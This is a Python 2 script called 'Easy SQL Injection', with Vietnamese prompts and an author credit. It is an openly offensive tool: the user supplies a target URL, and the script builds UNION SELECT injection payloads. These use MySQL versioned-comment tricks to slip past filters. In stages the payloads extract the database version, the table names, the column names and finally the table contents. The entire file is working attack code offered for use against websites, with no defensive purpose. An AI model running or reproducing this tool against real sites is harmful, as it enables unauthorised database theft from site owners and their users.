import re
import urllib2
import webbrowser
import socket
import wget
import os
import binascii
from urllib import urlencode
from sys import argv, exit

class SQLInjection():
	params = {}
	
	def checkIfSiteExists(self):
		print 'Kiem tra su ton tai cua site...'
		url = self.params["site"]
		htmlRes = urllib2.urlopen(url ,None, 120).read()
		if htmlRes:
			print "-->OK"
			return 1
		else:
			print "-->ERR"
			return 0
	
	def checkSite(self):
		rc = self.checkIfSiteExists()
		if rc == 0:
			return 0
		return rc
	
	def exploits(self):
		numofcol_txt = raw_input("So luong cot trong truy van: ")
		errorcol_txt = raw_input("So thu tu cot bi loi: ")
		self.params["numofcol"] = int(numofcol_txt)
		self.params["errorcol"] = int(errorcol_txt)
		if self.params["numofcol"] == 1:
			print "Dac biet qua, em bo tay a :'( "
			exit()
		self.params["col_1"] = ''
		self.params["col_2"] = ''
		self.params["col_3"] = ''
		self.params["col_type"] = 1
		idx = 1
		if self.params["errorcol"] == 1: ## No col_1,col_3...URL likes: version,2,3...,n
			idx = 2
			while (idx < self.params["errorcol"]):
				self.params["col_2"] = self.params["col_2"] + str(idx) + ","
				idx = idx + 1
			self.params["col_2"] = self.params["col_2"] + str(idx)
			self.params["col_type"] = 1
		elif self.params["errorcol"] == self.params["numofcol"]: ## No col_3, col_2...URL likes: 1,2,3,...,version
			idx = 1
			while (idx < (self.params["numofcol"] - 1)): ## last col for version
				self.params["col_1"] = self.params["col_1"] + str(idx) + ","
				idx = idx + 1
			self.params["col_1"] = self.params["col_1"] + str(idx)
			self.params["col_type"] = 2
		else: ## Last cases...URL likes: 1,2,3,...,version,x,y,z...
			idx = 1
			while (idx < self.params["errorcol"]):
				self.params["col_1"] = self.params["col_1"] + str(idx) + ","
				idx = idx + 1
			idx = self.params["errorcol"] + 1
			while (idx < self.params["numofcol"]):
				self.params["col_3"] = self.params["col_3"] + str(idx) + ","
				idx = idx + 1
			self.params["col_3"] = self.params["col_3"] + str(idx)
			self.params["col_type"] = 3
		self.params["step"] = 1
		self.executeSQLi()

	def getVersionCmd(self):
		tmp = "unhex(hex(group_concat(0x24,0x24,0x24,version(),0x24,0x24,0x24)))"
		self.params["ver_cmd"] = self.buildFromType(tmp)
		return str(self.params["ver_cmd"])
        
	def getTablesCmd(self):
		tmp = "unhex(hex(group_concat(0x24,0x24,0x24,/*!50000table_name*/,0x24,0x24,0x24)))"
		self.params["tbl_cmd"] = self.buildFromType(tmp)
		return self.params["tbl_cmd"]
    
	def getColumnsCmd(self):
		tmp = "unhex(hex(group_concat(0x24,0x24,0x24,/*!50000column_name*/,0x24,0x24,0x24)))"
		self.params["col_cmd"] = self.buildFromType(tmp)
		return self.params["col_cmd"]
    
	def getDataCmd(self):
		tmp = "unhex(hex(group_concat(0x24,0x24,0x24,"
		tmp = tmp + self.params["column_name"]
		tmp = tmp + ",0x24,0x24,0x24)))"
		self.params["dat_cmd"] = self.buildFromType(tmp)
		return self.params["dat_cmd"]

	def buildFromType(self,tmp):
		if self.params["col_type"] == 1:
		   return tmp +  self.params["col_2"]
		elif self.params["col_type"] == 2:
			return self.params["col_1"] + tmp
		elif self.params["col_type"] == 3:
			return self.params["col_1"] + tmp + ',' + self.params["col_3"]

	def executeSQLi(self):
		print "URL QUERY: \n"
		print self.buildFullUrl()
		url = self.buildFullUrl()
		htmlRes = self.downloadDocument(url)
		self.parseResultAndContinue(htmlRes)
    
	def parseResultAndContinue(self,htmlRes):
		if htmlRes:
			begin = htmlRes.find("$$$")
			if begin == -1:
				print "Khong the thuc hien sql injection...\n"
				exit()
			offset = 0
			while begin != -1:
				end = htmlRes.find("$$$",begin + 1)
				data = htmlRes[begin+3:end]
				#print data
				self.fillData(data)
				offset = end + 1
				begin = htmlRes.find("$$$",offset)
			self.params["step"] = self.params["step"] + 1
			self.executeSQLi()
		else:
			print "Khong the ket noi...\n"
			exit()

	def fillData(self,data):
		if self.params["step"] == 4: # Fill real data
			self.params["data_rs"].join(data)
		elif self.params["step"] == 3: # Fill columns
			print data
			self.params["column_rs"].join(data)
		elif self.params["step"] == 2: # Fill tables
			print data
			self.params["table_rs"].join(data)
		elif self.params["step"] == 1: # Fill versions
			print data
			self.params["version_rs"].join(data)
			
	def buildFullUrl(self):
		self.buildFullQuery();
		#print self.params["site"] + self.params["query"]
		return (self.params["site"] + self.params["query"])
    
	def buildFullQuery(self):
		if self.params["step"] == 1: # get version
			self.params["query"] = " /*!50000UniOn*/ /*!50000SeLeCt*/ " + self.getVersionCmd() + "-- -"
			self.params["step_done"] = 1
		elif self.params["step"] == 2: # get table
			self.params["query"] = " /*!50000UniOn*/ /*!50000SeLeCt*/ " + self.getTablesCmd() + " /*!50000FrOm*/ information_schema./*!50000tables*/ where /*!table_schema*/=database()-- -"
			self.params["step_done"] = 2
		elif self.params["step"] == 3: # get column
			if self.params["table_name"] == "":
				self.params["table_name"] = raw_input("Nhap table name: ")
			#tbl_name_hex = int(self.params["table_name"],16) 
			tbl_name_hex = self.params["table_name"].encode("hex")
			self.params["query"] = " /*!50000UniOn*/ /*!50000SeLeCt*/ " + self.getColumnsCmd() + " /*!50000FrOm*/ information_schema./*!50000columns*/ where /*!table_schema*/=database() and /*!50000table_name*/=0x" + tbl_name_hex + "-- -" 
			self.params["step_done"] = 3
		elif self.params["step"] == 4: # get data        
			if self.params["column_name"] == "":
				self.params["column_name"] = raw_input("Nhap danh sach cot: ")
			self.params["query"] = " /*!50000UniOn*/ /*!50000SeLeCt*/ " + self.getDataCmd() + " /*!50000FrOm*/ " + self.params["table_name"] + "-- -"
		return str(self.params["query"])

	def start(self):
		print'+------------------+'
		print'|Easy SQL Injection|'
		print'+------------------+'
		print'>> Porwered by Silverwolf'
		print'>> FB: http://facebook.com/soibac'
		print'>> Site: http://nicedesigns.vv.si'
		print' '
		self.params["site"] = ''
		self.params["data_rs"] = ''
		self.params["column_rs"] = ''
		self.params["table_rs"] = ''
		self.params["version_rs"] = ''
		self.params["step"] = 1
		self.params["table_name"] = ''
		self.params["column_name"] = ''
		
		if len(argv) < 2:
			filename = argv[0].replace('\\', '/').split('/')[-1]
			print 'Vi du: ' + filename + ' http://target.com/index.php\n'
			self.params["site"] = raw_input('Duong dan site: ')
		else:
			self.params["site"] = argv[1]
		if self.checkSite() == 0:
			exit()
		self.exploits()
	
	def readDataFromUrl(self,url):
		htmlRes = ''
		user_agent = 'Mozilla/5.0 (Windows NT 6.1; Intel Mac OS X 10.6; rv:7.0.1) Gecko/20100101 Firefox/7.0.1'
		headers = { 'User-Agent' : user_agent }
		req = urllib2.Request(url,None,headers)
		#htmlRes = urllib2.urlopen(req).read()
		try:
			response = urllib2.urlopen(req)
			chunk = True
			while chunk:
				chunk = response.read(1024)
				htmlRes += chunk
				#print chunk
			response.close()
		except IOError:
			print 'can\'t open',url 
			return htmlRes
		return htmlRes

	def downloadDocument(self,url):
		htmlRes = ''
		filename = wget.download(url)
		f = open(filename)
		htmlRes = f.read()
		f.close()
		os.remove("debug.html")
		os.rename(filename,"debug.html")
		print "\n"
		return htmlRes	
        
if __name__ == '__main__':
	hdl = SQLInjection()
	hdl.start()